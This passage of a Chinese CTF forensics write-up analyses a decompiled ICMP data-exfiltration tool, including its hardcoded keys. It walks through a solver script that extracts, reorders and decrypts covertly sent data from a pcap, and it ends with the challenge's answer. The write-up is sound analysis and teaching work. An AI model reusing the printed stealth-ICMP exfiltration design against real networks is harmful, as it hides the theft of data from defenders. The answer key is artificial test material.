@@ -3478,13 +3478,11 @@ Unsupported opcode: POP_JUMP_IF_NOT_NONE (238)
         pass
     # WARNING: Decompyle incomplete
 
-    
     def _init_keys(self):
         base_material = self.master_seed + self._k1
         self.key_layer1 = PBKDF2(base_material, self._k2 + b'\x01', dkLen = 32, count = 10000)
         self.key_layer2 = PBKDF2(base_material + self.key_layer1, self._k2 + b'\x02', dkLen = 32, count = 10000)
 
-    
     def encrypt_data(self, plaintext):
         length_header = len(plaintext).to_bytes(4, 'big')
         data_with_header = length_header + plaintext
@@ -3498,11 +3496,8 @@ Unsupported opcode: POP_JUMP_IF_NOT_NONE (238)
         layer2_result = nonce2 + tag2 + ct2
         return layer2_result
 
-    
     def get_master_seed(self):
         return self.master_seed
-
-
 
 class EnhancedScrambler:
     def __init__(self, scramble_seed):
@@ -3510,20 +3505,17 @@ class EnhancedScrambler:
         self.rng = random.Random(self.seed)
         self.shuffle_table = self._generate_shuffle_table()
 
-    
     def _generate_shuffle_table(self):
         table = list(range(256))
         self.rng.shuffle(table)
         return table
 
-    
     def _apply_transform(self, index, total_count):
         step1 = (index * 17 + 23) % total_count
         step2 = (step1 ^ total_count - index) % total_count
         step3 = (step2 + self.shuffle_table[index % 256]) % total_count
         return step3
 
-    
     def scramble_chunks(self, chunks):
         total = len(chunks)
         scrambled = []
@@ -3532,17 +3524,13 @@ class EnhancedScrambler:
             scrambled.append((new_idx, original_idx, chunks[original_idx]))
         return scrambled
 
-    
     def get_seed(self):
         return self.seed
-
-
 
 class StealthICMP:
     def __init__(self, target_ip):
         self.target = target_ip
 
-    
     def build_packet(self, payload, metadata):
         (chunk_idx, total_chunks, extra) = metadata
         icmp_id = self._calc_id(chunk_idx, total_chunks)
@@ -3554,25 +3542,20 @@ class StealthICMP:
         pkt = ip / icmp / packet_data
         return pkt
 
-    
     def _calc_id(self, idx, total):
         val = idx * 0x9E3779B9 + 305419896 & 0xFFFFFFFF
         return val >> 16 & 65535
 
-    
     def _calc_seq(self, idx, total):
         val = idx * 0x9E3779B9 + 305419896 & 0xFFFFFFFF
         return val & 65535
 
-    
     def _get_ping_prefix(self):
         prefixes = [
             b'abcdefghijklmnop',
             b'qrstuvwabcdefghi',
             bytes(range(16))]
         return random.choice(prefixes)
-
-
 
 class BalancedExfiltrator:
     def __init__(self, target_ip, chunk_size = (224,)):
@@ -3585,14 +3568,11 @@ class BalancedExfiltrator:
         self.scrambler = EnhancedScrambler(self.scramble_seed)
         self.icmp_builder = StealthICMP(target_ip)
 
-    
     def exfiltrate(self, filepath):
 Unsupported opcode: BEFORE_WITH (108)
         print(f'''[*] Target: {self.target_ip}''')
         print(f'''[*] File: {filepath}''')
     # WARNING: Decompyle incomplete
-
-
 
 def main():
     if len(sys.argv) < 3:
@@ -3615,9 +3595,233 @@ return None
 
 翻看一下代码，代码大致的意思就是用icmp协议传输数据，并且传输过程中的数据是加密并且混淆过的
 
-```python
+并且加密的时候要用到两个密钥，但是这里直接反编译是得不到密钥的
 
+有两种方法得到这俩密钥，第一中就是直接010打开，拉到这一段的位置，可以看到明文的密钥
+
+![](./imgs/image-20260113195109719.png)
+
+第二种方法就是直接把整个pyc文件发给GPT，顺便让它把解密代码也写了
+
+```python
+import random
+from typing import Dict, Tuple
+from Crypto.Cipher import AES, ChaCha20_Poly1305
+from Crypto.Protocol.KDF import PBKDF2
+from scapy.all import rdpcap, ICMP
+
+
+# ----------------------------
+# 1) 逆向加密逻辑类
+# ----------------------------
+class CryptoRecoverer:
+    def __init__(self, master_seed: bytes):
+        self.master_seed = master_seed
+        self._k1 = b"Bloodharbor!2024"
+        self._k2 = b"Silent_Update!!!"
+        self._init_keys()
+
+    def _init_keys(self):
+        base_material = self.master_seed + self._k1
+        self.key_layer1 = PBKDF2(
+            base_material,
+            self._k2 + b"\x01",
+            dkLen=32,
+            count=10000
+        )
+        self.key_layer2 = PBKDF2(
+            base_material + self.key_layer1,
+            self._k2 + b"\x02",
+            dkLen=32,
+            count=10000
+        )
+
+
+# ----------------------------
+# 2) ICMP id/seq 与 chunk idx 的映射
+# ----------------------------
+def calc_icmp_fields(idx: int) -> Tuple[int, int]:
+    """
+    val = (idx * 2654435769 + 305419896) & 0xFFFFFFFF
+    return (val >> 16) & 0xFFFF, val & 0xFFFF
+    """
+    val = (idx * 2654435769 + 305419896) & 0xFFFFFFFF
+    return (val >> 16) & 0xFFFF, val & 0xFFFF
+
+
+# ----------------------------
+# 3) 主解题流程
+# ----------------------------
+def solve_pcap(pcap_file: str):
+    print(f"[*] 正在加载流量包 {pcap_file} ...")
+    packets = rdpcap(pcap_file)
+
+    raw_chunks: Dict[Tuple[int, int], bytes] = {}
+
+    print("[*] 正在提取 ICMP Payload（仅 echo-request type=8）...")
+    for pkt in packets:
+        if pkt.haslayer(ICMP) and pkt[ICMP].type == 8:
+            # 原脚本加入了 16 字节前缀，需去除
+            payload = bytes(pkt[ICMP].payload)[16:]
+            raw_chunks[(int(pkt[ICMP].id), int(pkt[ICMP].seq))] = payload
+
+    if not raw_chunks:
+        print("[-] 错误: 没有提取到任何 ICMP echo-request 数据。")
+        return
+
+    # 1) 寻找 Metadata (EX1L)
+    metadata = None
+    meta_key = None
+    for (pid, pseq), data in raw_chunks.items():
+        if data.startswith(b"EX1L"):
+            metadata = data
+            meta_key = (pid, pseq)
+            print(f"[+] 找到元数据块! ID: {pid}, Seq: {pseq}")
+            break
+
+    if not metadata:
+        print("[-] 错误: 未找到 EX1L 元数据。")
+        return
+
+    # 解析元数据：crypto_seed(16) + scramble_seed(u32, big)
+    crypto_seed = metadata[4:20]
+    scramble_seed = int.from_bytes(metadata[20:24], "big")
+    print(f"[*] Crypto Seed: {crypto_seed.hex()}")
+    print(f"[*] Scramble Seed: {hex(scramble_seed)} ({scramble_seed})")
+
+    # 2) 根据 calc_icmp_fields(idx) 抽取所有加密块（idx 从 1 开始递增，直到断档）
+    data_chunks_indexed: Dict[int, bytes] = {}
+    idx = 1
+    while True:
+        target_id, target_seq = calc_icmp_fields(idx)
+        k = (target_id, target_seq)
+        if k in raw_chunks:
+            data_chunks_indexed[idx] = raw_chunks[k]
+            idx += 1
+        else:
+            break
+
+    num_data_chunks = len(data_chunks_indexed)
+    print(f"[+] 成功提取到 {num_data_chunks} 个有效加密块")
+
+    if num_data_chunks == 0:
+        print("[-] 错误: 没有提取到任何有效 chunk（请确认 pcap 里是否丢包/筛选是否正确）。")
+        return
+
+    # 3) 还原 Shuffle 混淆顺序（按 PDF）
+    rng = random.Random(scramble_seed)
+    indices = list(range(num_data_chunks))
+    rng.shuffle(indices)
+
+    reordered_chunks = [None] * num_data_chunks
+    for new_pos, orig_idx in enumerate(indices):
+        # new_pos 是“混淆后位置”，orig_idx 是“原始位置”
+        # data_chunks_indexed 的 idx 从 1 开始
+        reordered_chunks[orig_idx] = data_chunks_indexed[new_pos + 1]
+
+    # 拼接得到 full_blob
+    full_blob = b"".join(reordered_chunks)
+
+    # 4) 解密流程
+    recoverer = CryptoRecoverer(crypto_seed)
+
+    # --- Layer 2: AES-GCM ---
+    print("[*] 正在尝试解密 Layer 2 (AES-GCM)...")
+    if len(full_blob) < 32:
+        print("[-] full_blob 太短，无法包含 nonce+tag。")
+        return
+
+    nonce2 = full_blob[:16]
+    tag2 = full_blob[16:32]
+    ct2 = full_blob[32:]
+
+    layer1_result = None
+    for i in range(225):  # 最多回退 224 字节
+        test_ct2 = ct2 if i == 0 else ct2[:-i]
+        try:
+            cipher2 = AES.new(recoverer.key_layer2, AES.MODE_GCM, nonce=nonce2)
+            layer1_result = cipher2.decrypt_and_verify(test_ct2, tag2)
+            print(f"[+] Layer 2 解密成功! (剔除了 {i} 字节填充)")
+            break
+        except ValueError:
+            continue
+
+    if not layer1_result:
+        print("[-] Layer 2 解密失败：MAC 校验不匹配。请检查是否有丢包或字节偏移。")
+        return
+
+    # --- Layer 1: ChaCha20-Poly1305 ---
+    print("[*] 正在尝试解密 Layer 1 (ChaCha20-Poly1305)...")
+    if len(layer1_result) < 28:
+        print("[-] layer1_result 太短，无法包含 nonce+tag。")
+        return
+
+    nonce1 = layer1_result[:12]
+    tag1 = layer1_result[12:28]
+    ct1 = layer1_result[28:]
+
+    final_data = None
+    for j in range(225):
+        test_ct1 = ct1 if j == 0 else ct1[:-j]
+        try:
+            cipher1 = ChaCha20_Poly1305.new(key=recoverer.key_layer1, nonce=nonce1)
+            decrypted = cipher1.decrypt_and_verify(test_ct1, tag1)
+
+            if len(decrypted) < 4:
+                continue
+            orig_len = int.from_bytes(decrypted[:4], "big")
+            final_data = decrypted[4:4 + orig_len]
+            print(f"[+] Layer 1 解密成功! 原始文件长度: {orig_len} 字节")
+            break
+        except ValueError:
+            continue
+
+    if not final_data:
+        print("[-] Layer 1 解密失败。")
+        return
+
+    output_name = "recovered.bin"
+    with open(output_name, "wb") as f:
+        f.write(final_data)
+
+    print(f"[+] 任务完成! 文件已保存为: {output_name}")
+
+
+if __name__ == "__main__":
+    pcap = "icmp.pcap"
+    solve_pcap(pcap)
+    
+    # [*] 正在加载流量包 icmp.pcap ...
+    # [*] 正在提取 ICMP Payload（仅 echo-request type=8）...
+    # [+] 找到元数据块! ID: 4660, Seq: 22136
+    # [*] Crypto Seed: 63c045c27938d319c4bf1efc80fd6d80
+    # [*] Scramble Seed: 0x6cfb72 (7142258)
+    # [+] 成功提取到 146585 个有效加密块
+    # [*] 正在尝试解密 Layer 2 (AES-GCM)...
+    # [+] Layer 2 解密成功! (剔除了 178 字节填充)
+    # [*] 正在尝试解密 Layer 1 (ChaCha20-Poly1305)...
+    # [+] Layer 1 解密成功! 原始文件长度: 32834798 字节
+    # [+] 任务完成! 文件已保存为: recovered.bin
 ```
+
+然后010打开恢复后的文件，发现是个zip，因此改后缀为.zip后解压
+
+解压后可以得到100张人员信息表
+
+![image-20260113200153729](./imgs/image-20260113200153729.png)
+
+
+
+![image-20260113200137359](./imgs/image-20260113200137359.png)
+
+可以人眼去找，也可以写脚本或者直接WPS图片转文字
+
+![image-20260113200347902](./imgs/image-20260113200347902.png)
+
+最后直接搜索题目要求的手机号即可得到第三题的答案：`江苏省南京市鼓楼区西湖路200号梧桐里15栋4单元101室`
+
+![image-20260113200543129](./imgs/image-20260113200543129.png)
+
 
 
 
